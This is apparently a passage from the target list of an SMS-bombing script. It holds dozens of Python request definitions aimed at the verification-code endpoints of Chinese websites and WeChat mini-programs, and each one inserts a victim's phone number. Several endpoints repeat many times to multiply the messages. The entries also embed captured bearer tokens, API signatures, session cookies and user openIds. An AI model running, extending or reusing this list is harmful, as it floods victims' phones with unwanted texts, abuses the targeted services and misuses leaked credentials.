"Connection": "keep-alive",
"Authorization": "Bearer",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx099ab6800de760b5/10/page-frame.html"
}
},
{
"name": "biz.ronghehui.cn",
"url": "https://biz.ronghehui.cn/app/mobile/check",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"Host": "biz.ronghehui.cn",
"Connection": "keep-alive",
"Authorization": "Bearer 34c61758-7c93-44a7-8f31-c8ebb6321c18",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx713bfc22428fd8ed/83/page-frame.html"
}
},
{
"name": "gate.mp.porsche.cn",
"url": "https://gate.mp.porsche.cn/cnid-uniportal-service/api/v1/omp/profile/update-phone/sms-code",
"method": "POST",
"json_data": {
"phone": "+86" + f"{phone}",
"scenario": "personalPage"
},
"headers": {
"Host": "gate.mp.porsche.cn",
"Connection": "keep-alive",
"tenant-id": "FM191342",
"X-LOCALID-FLAG": "true",
"x-open-id": "oGp5t5Y7CZjqUuglMHE1_Kbh2wY4",
"Authorization": "Bearer eyJraWQiOiJ2Z0M4ZmpNMjI0YkRnTnN1MnhfZVIiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJjb25uZWN0ZWQiOiI1ZGExM2YzMTJjYTBlY2Q0YjM4NzM5ZGZiNjJjNGIzZDM5YjA3NTA5ZWRmNWQ3YjUyM2VlOGY3OGJjY2I5Yjk4Iiwic3ViIjoiOTI2OTA2ZmQtNDQ3NS00NjA0LTk0MGEtOTM3NDcxMWM1ZjlkIiwiYXVkIjoiRk0xOTEzNDIiLCJuYmYiOjE3NjcyMTkzMzIsImF6cCI6IkZNMTkxMzQyIiwic2NvcGUiOiJvcGVuaWQgb2ZmbGluZV9hY2Nlc3MgY29ubmVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXV0aC5wb3JzY2hlLmNuIiwiZXhwIjoxNzY3MjYyNTMyLCJpYXQiOjE3NjcyMTkzMzIsImxvY2FsSWQiOiI5MjY5MDZmZC00NDc1LTQ2MDQtOTQwYS05Mzc0NzExYzVmOWQiLCJqdGkiOiJkY2JhMjA4Mi1lZjczLTRmZGQtOWNlNC04NmU0ZDZkYjZmMGMifQ.cuX--3Inipqd7QYyq5ToYoc8OlgCKCDEHIZQayFzZg34wFoWk6gZ3PGgdAarYVpSULZPuKQ_cKQMiSQkhjwZV4OK47uE2Wj76SL-E-7mw0ESEHD5B4Fe1tuWsa3DHdjAeCFD6Z9qVQdFjf0qafeVyENN6GzIK_SsenEbo2T646G57IhA4m29enkyspOad3CWfJe0qyrJv5Qi8JCJFGW9fX7KY5KFvwo2-7bDxDMYYBvqY-b9OP5z8Vo-GWk-yWoTf6U2HpdYs0ET5n9NvidqYDZXrtvkLHTEqQCclrLk2fpDQ51aXV4QIOlbhQllDFKKJm-ZGZBwl4m_IZUGmztP1Q",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx31bdc34cfd626133/279/page-frame.html"
}
},
{
"name": "jclg.zhiliaohr.com",
"url": "https://jclg.zhiliaohr.com/api/sms/send",
"method": "POST",
"data": "mobile=" + f"{phone}" + "&event=log_reg&token=&userTypeCur=1",
"headers": {
"Host": "jclg.zhiliaohr.com",
"Connection": "keep-alive",
"platform": "mp-weixin",
"sn": "",
"content-type": "application/x-www-form-urlencoded",
"token": "",
"withdrawal": "",
"lat": "[object Undefined]",
"lng": "[object Undefined]",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx2266bf822292f7db/172/page-frame.html"
}
},
{
"name": "admin.nong360.net",
"url": "https://admin.nong360.net/base/api/register/sendMsg",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"Host": "admin.nong360.net",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx408a4aa1b432a5de/199/page-frame.html"
}
},
{
"name": "jishengwei.wellwhales.com",
"url": "https://jishengwei.wellwhales.com/api2/?op=sendsms",
"method": "POST",
"json_data": {
"mycode": "858404,19423e4262bde1f7a3835e3d35779bdf",
"phone": f"{phone}"
},
"headers": {
"Host": "jishengwei.wellwhales.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxffe01b1e13ea6dd9/15/page-frame.html"
}
},
{
"name": "mfyj.gxws.cn",
"url": "https://mfyj.gxws.cn:8889/byt/m/napi/sms/sendSMS.do",
"method": "POST",
"data": "showLoading=false&telephone=" + f"{phone}",
"headers": {
"Host": "mfyj.gxws.cn:8889",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxe123b6962bd58156/38/page-frame.html"
}
},
{
"name": "byt.myjhky.com",
"url": "https://byt.myjhky.com/byt/m/napi/sms/sendSMS.do",
"method": "POST",
"data": "showLoading=false&telephone=" + f"{phone}",
"headers": {
"Host": "byt.myjhky.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxa35646c93ec45321/25/page-frame.html"
}
},
{
"name": "vip.luyuan.cn",
"url": "https://vip.luyuan.cn/huiyuan/user/sendcaptcha",
"method": "GET",
"params": {
"cellphone": f"{phone}"
},
"headers": {
"Host": "vip.luyuan.cn",
"Connection": "keep-alive",
"api-sign": "54595f70a20315464988b9830db375e575e12544d0ea6b2719ec57de83bddb12",
"api-key": "1767308494603",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx7a47c4837513ee24/183/page-frame.html"
}
},
{
"name": "rrj.cpskd.cn",
"url": "https://rrj.cpskd.cn/cps/open/auth/otp",
"method": "POST",
"json_data": {
"mobileNo": f"{phone}",
"captchaVerification": "",
"uuid": ""
},
"headers": {
"Host": "rrj.cpskd.cn",
"Connection": "keep-alive",
"token": "",
"appid": "wx2cfb607e974c03ce",
"platform": "miniApp",
"version": "3",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx2cfb607e974c03ce/123/page-frame.html"
}
},
{
"name": "marketing.nio.com",
"url": "https://marketing.nio.com/dino/proxy/arch/v1/leads/verification-code/send",
"method": "POST",
"json_data": {
"countryCode": "86",
"mobile": f"{phone}",
"captchaId": "7dbe434c7764491daa9aea89c26f4836"
},
"headers": {
"Host": "marketing.nio.com",
"Connection": "keep-alive",
"X-Page-Url": "modules/hana/pages/drive/index?origin=xcxgoucheshouping",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxb0539bdcf5ba43d8/25/page-frame.html"
}
},
{
"name": "www.crcccl.com",
"url": "https://www.crcccl.com/tjyz/api/igo-cloud-member/login/verificationCodeCheck",
"method": "POST",
"params": {
"imageCode": "rnDb"
},
"cookies": {
"ImageVerifyCode": "rnDB",
"path": "/"
},
"headers": {
"Host": "www.crcccl.com",
"Connection": "keep-alive",
"content-type": "application/json;charset=UTF-8",
"Authorization": "",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx231cb756286c4c0f/48/page-frame.html"
}
},
{
"name": "www.crcccl.com",
"url": "https://www.crcccl.com/tjyz/api/igo-cloud-member/member/register/registerSendVerificationCode",
"method": "POST",
"json_data": {
"phoneNum": f"{phone}",
"imageCode": "rnDb"
},
"cookies": {
"ImageVerifyCode": "rnDB",
"path": "/"
},
"headers": {
"Host": "www.crcccl.com",
"Connection": "keep-alive",
"content-type": "application/json;charset=UTF-8",
"Authorization": "",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx231cb756286c4c0f/48/page-frame.html"
}
},
{
"name": "eservice.fcagroupafc.com",
"url": "https://eservice.fcagroupafc.com/wechat_fiat/register/sendauthcode.html",
"method": "GET",
"params": {
"nickName": "%E5%B0%8F%E7%8E%AE",
"userPhone": f"{phone}",
"security": "sino!FD%40SF%23sd%26*NS",
"randomString": "egbd",
"openId": "odsYU0TOCo38xJfEQNnCEFoRGSGA"
},
"headers": {
"Host": "eservice.fcagroupafc.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxe4f4da770e2d8596/70/page-frame.html"
}
},
{
"name": "citydists.51ctu.com",
"url": "https://citydists.51ctu.com/api/Login/SendRmCode",
"method": "POST",
"data": "phone=" + f"{phone}" + "&AppletOpenId=",
"headers": {
"Host": "citydists.51ctu.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx242e867ebb4acac8/21/page-frame.html"
}
},
{
"name": "gcx.gxbtxc.com",
"url": "https://gcx.gxbtxc.com/admin-api/system/auth/sendCode",
"method": "POST",
"json_data": {
"mobile": f"{phone}"
},
"headers": {
"Host": "gcx.gxbtxc.com",
"Connection": "keep-alive",
"content-type": "application/json",
"Authorization": "Bearer undefined",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx9a334ed7a3158e70/27/page-frame.html"
}
},
{
"name": "fwapi.lixiangsys.com",
"url": "https://fwapi.lixiangsys.com/v1/sms/unauth_codes",
"method": "POST",
"json_data": {
"mobile": f"{phone}"
},
"headers": {
"Host": "fwapi.lixiangsys.com",
"Connection": "keep-alive",
"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcm4iOiIyIiwiZXhwIjoxNzY3NDIyNjkyLCJwbGF0Zm9ybV9pZCI6IjM5IiwidXNlcl9pZCI6IiIsInVzZXJfbmFtZSI6IiIsInd4X2FwcGlkIjoid3hkOTFjNjk0NGMwYjI0OGYwIiwid3hfb3BlbmlkIjoib05GQ283ZmVTYml3MnphNHJIVDY0SkV6U2hMWSJ9.ZZBubVk2sl8S3IzZXK0MsT1_G_8ljmV0JDGHi9Zfl-I",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxd91c6944c0b248f0/1/page-frame.html"
}
},
{
"name": "miniapp.brilliance-bea.com",
"url": "https://miniapp.brilliance-bea.com/miniprogram/noauth/login/loginaddmessagecode.html",
"method": "POST",
"data": "userPhone=" + f"{phone}",
"headers": {
"Host": "miniapp.brilliance-bea.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"X-Tingyun": "c=M|p35OnrDoP8k",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf0eb89a80ad3dbbf/139/page-frame.html"
}
},
{
"name": "miniapp.brilliance-bea.com",
"url": "https://miniapp.brilliance-bea.com/miniprogram/noauth/login/loginaddmessagecode.html",
"method": "POST",
"data": "userPhone=" + f"{phone}",
"headers": {
"Host": "miniapp.brilliance-bea.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"X-Tingyun": "c=M|p35OnrDoP8k",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf0eb89a80ad3dbbf/139/page-frame.html"
}
},
{
"name": "miniapp.brilliance-bea.com",
"url": "https://miniapp.brilliance-bea.com/miniprogram/noauth/login/loginaddmessagecode.html",
"method": "POST",
"data": "userPhone=" + f"{phone}",
"headers": {
"Host": "miniapp.brilliance-bea.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"X-Tingyun": "c=M|p35OnrDoP8k",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf0eb89a80ad3dbbf/139/page-frame.html"
}
},
{
"name": "miniapp.brilliance-bea.com",
"url": "https://miniapp.brilliance-bea.com/miniprogram/noauth/login/loginaddmessagecode.html",
"method": "POST",
"data": "userPhone=" + f"{phone}",
"headers": {
"Host": "miniapp.brilliance-bea.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"X-Tingyun": "c=M|p35OnrDoP8k",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf0eb89a80ad3dbbf/139/page-frame.html"
}
},
{
"name": "miniapp.brilliance-bea.com",
"url": "https://miniapp.brilliance-bea.com/miniprogram/noauth/login/loginaddmessagecode.html",
"method": "POST",
"data": "userPhone=" + f"{phone}",
"headers": {
"Host": "miniapp.brilliance-bea.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"X-Tingyun": "c=M|p35OnrDoP8k",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf0eb89a80ad3dbbf/139/page-frame.html"
}
},
{
"name": "m.sinosafe.com.cn",
"url": "https://m.sinosafe.com.cn/pup/usercenter/sms/sendSms",
"method": "POST",
"params": {
"t": "1767381289566"
},
"data": "mobile=" + f"{phone}" + "&smsSource=usercenter&smsType=wcm_xcx_login",
"cookies": {
"wsc_token": "XCX6B549E8B8F0C4E548BE37D9670D1DDDA1767381282219"
},
"headers": {
"Host": "m.sinosafe.com.cn",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxb796b282c3efbb78/23/page-frame.html"
}
},
{
"name": "ypt.39chuangmeng.com",
"url": "https://ypt.39chuangmeng.com/wsy_user/web/index.php?m=set&a=send_code",
"method": "POST",
"data": "bind_phone=" + f"{phone}" + "&country_code=%2B86&customer_id=7921&mini_user_token=5c4374db540aaaa6e72e066cec5cc300&switch_mini_user_token=&user_id=482602001&client=mini_pro",
"headers": {
"Host": "ypt.39chuangmeng.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx5c02fb843ff6723e/1/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "wx.zcsoftware.com",
"url": "https://wx.zcsoftware.com/wl2024/jc/JcOperator/sendSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"loginSign": 1,
"typeSign": 4
},
"headers": {
"Host": "wx.zcsoftware.com",
"Connection": "keep-alive",
"Authorization": "",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxc93fe8522904fea7/45/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "hpb.ppbasia.com",
"url": "https://hpb.ppbasia.com/index/hpb_api/sendSms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"captcha_id": "0b1Dqu000jHfCV1Pb7100jSIpQ0Dqu0q",
"app_channel": "official"
},
"headers": {
"Host": "hpb.ppbasia.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx11ac478a63fdf5ea/52/page-frame.html"
}
},
{
"name": "passport.xag.cn",
"url": "https://passport.xag.cn/home/sms_code",
"method": "POST",
"data": "icc=86&phone=" + f"{phone}",
"headers": {
"Host": "passport.xag.cn",
"Connection": "keep-alive",
"mini": "member",
"Accept": "application/json",
"content-type": "application/x-www-form-urlencoded",
"X-Requested-With": "XMLHttpRequest",
"token": "",
"Authorization": "Basic RjIxMUIwODFCQ0FFNERBM0ZCMzBDNUU4MThCRkRBRjI6ODdmMzc5ODdhMjc5MmRiNDU0ZDkzNGM0NGNiY2JlZjM=",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx43471742f3e783cb/248/page-frame.html"
}
},
{
"name": "www.baobai.com",
"url": "https://www.baobai.com/mobile/index.php?act=member_account&op=xcx_modify_mobile_step1",
"method": "POST",
"data": "key=1f531170ca9e7b03f2e272223eaa0dc4&mobile=" + f"{phone}",
"headers": {
"Host": "www.baobai.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx40c4827cc63545ea/29/page-frame.html"
}
},
{
"name": "hmb.baoxian72.com",
"url": "https://hmb.baoxian72.com/hmb_m_hainan_2025/services/SMS/sendCaptcha",
"method": "POST",
"json_data": {
"mobile": f"{phone}"
},
"cookies": {
"HWWAFSESID": "58fee73b638d11198f",
"HWWAFSESTIME": "1767388297912",
"sajssdk_2015_cross_new_user": "1",
"sensorsdata2015jssdkcross": "%7B%22distinct_id%22%3A%2219b808d3a46335-0ba979030520848-497c7962-288000-19b808d3a4798%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTliODA4ZDNhNDYzMzUtMGJhOTc5MDMwNTIwODQ4LTQ5N2M3OTYyLTI4ODAwMC0xOWI4MDhkM2E0Nzk4In0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219b808d3a46335-0ba979030520848-497c7962-288000-19b808d3a4798%22%7D",
"AGL_USER_ID": "001a8f3c-fe68-4bc1-a5fb-2fc2b642f0df",
"Hm_lvt_073a545f97a96fafc3228e9e8b1ed5e8": "1767388298",
"HMACCOUNT": "D0094CD5A243E51C",
"Hm_lvt_b05e3b1d5d6ee72cedb2dd25e51389fc": "1767388298",
"_bl_uid": "6gmL9j2mx8kdd3c3Xyeemnkx5j0F",
"zg_815af4232f7749c783dfec91755f5631": "%7B%22sid%22%3A%201767388297546%2C%22updated%22%3A%201767388299162%2C%22info%22%3A%201767388297563%2C%22superProperty%22%3A%20%22%7B%5C%22%E6%83%A0%E6%B0%91%E4%BF%9D%5C%22%3A%20%5C%22%E6%99%8B%E5%BA%B7%E4%BF%9D%5C%22%7D%22%2C%22platform%22%3A%20%22%7B%7D%22%2C%22utm%22%3A%20%22%7B%7D%22%2C%22referrerDomain%22%3A%20%22%22%2C%22landHref%22%3A%20%22https%3A%2F%2Fhmb.baoxian72.com%2Fshanxi_mobile_2025%2Findex.html%3FchannelCode%3Dyxhb00000001%26baosicode%3DSHANXI2025001128%26t%3D1767388290925%26hmbOpenId%3Do0SF365mx3oa2wtcTUNpr-TkKqdE%26hmbSource%3Dmini%23%2Finsu-detail%22%2C%22prePath%22%3A%20%22https%3A%2F%2Fhmb.baoxian72.com%2Fshanxi_mobile_2025%2Findex.html%3FchannelCode%3Dyxhb00000001%26baosicode%3DSHANXI2025001128%26t%3D1767388290925%26hmbOpenId%3Do0SF365mx3oa2wtcTUNpr-TkKqdE%26hmbSource%3Dmini%23%2Fend%22%2C%22duration%22%3A%202487.624%7D",
"zg_did": "%7B%22did%22%3A%20%2219b808d392634c-056d8690ee616f-497c7962-46500-19b808d3927445%22%7D",
"Hm_lpvt_073a545f97a96fafc3228e9e8b1ed5e8": "1767388322",
"Hm_lpvt_b05e3b1d5d6ee72cedb2dd25e51389fc": "1767388322"
},
"headers": {
"Host": "hmb.baoxian72.com",
"Connection": "keep-alive",
"wxToken": "Ai9aPrUXhvaMvuGqrNnbAA==",
"Accept": "application/json, text/plain, /",
"X-Requested-With": "XMLHttpRequest",
"Content-Type": "application/json",
"Origin": "https://hmb.baoxian72.com",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://hmb.baoxian72.com/hainan_mobile_2025/index.html?channelCode=yxhb00000001&baosicode=HAINAN2025001099&t=1767388315088&hmbOpenId=owN-G6_oZr-Jgsu00nZsY7VYUVKo&hmbSource=mini"
}
},
{
"name": "emall.huarunbao.com",
"url": "https://emall.huarunbao.com/api/emall/h5/common/v1/sms/code",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"Host": "emall.huarunbao.com",
"Connection": "keep-alive",
"Accept": "application/json, text/plain, /",
"channelCode": "CRINS_INSURANCE_STORE",
"token": "",
"Origin": "https://emall-h5.huarunbao.com",
"X-Requested-With": "mark.via",
"Sec-Fetch-Site": "same-site",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty"
}
},
{
"name": "user.lingjuliwl.cn",
"url": "https://user.lingjuliwl.cn/prod-api/system/sms/sendSms",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"Host": "user.lingjuliwl.cn",
"Connection": "keep-alive",
"content-type": "application/json; charset=UTF-8",
"clientid": "ef5d9675159ac576ce32c87e3b6bbdef",
"Content-Language": "zh_CN",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx95d1a168f581427b/50/page-frame.html"
}
},
{
"name": "mk.ykkzz.cn",
"url": "https://mk.ykkzz.cn/make_rider/v1/send_provider_sms",
"method": "POST",
"data": "mobile=" + f"{phone}" + "&type=rider_login&code=&captcha_key=&uniacid=33&mk_version=3.0.0",
"headers": {
"Host": "mk.ykkzz.cn",
"Connection": "keep-alive",
"contentType": "application/json",
"Accept": "application/json",
"content-type": "application/x-www-form-urlencoded",
"Authorization": "",
"MkTimestamp": "1767391547",
"MkVersion": "3.0.0",
"MkNoncestr": "bzAF99xnR4",
"MkSiganture": "cea7a706b400d283ae04ac8d461b73dc",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxe91c14f2dcc37eaa/4/page-frame.html"
}
},
{
"name": "ycx.cqmetro.cn",
"url": "https://ycx.cqmetro.cn//bas/mc/v1/send-sms-code",
"method": "POST",
"data": "{\"mobile_phone\":\"f{phone}\",\"sms_type\":\"0\"}", 
"headers": {
"Host": "ycx.cqmetro.cn",
"Connection": "keep-alive",
"charset": "utf-8",
"signature": "Jsz+LXqnwqX2bghxG7QmumvxMMYXtIu1E3/dgYE7qgLDdgggleV711ATvebklUEWzvppqpKTFxvK4v9uAKwaZQj+xNF4e8LCftuAh2iouphUyJqIz39JMRNS7PxvzfntiC9rh8POX84LLwvYjOzISEB2+eE1+N2+DBENnA3Pfys=",
"cityid": "5000",
"Accept-Encoding": "gzip,compress,br,deflate",
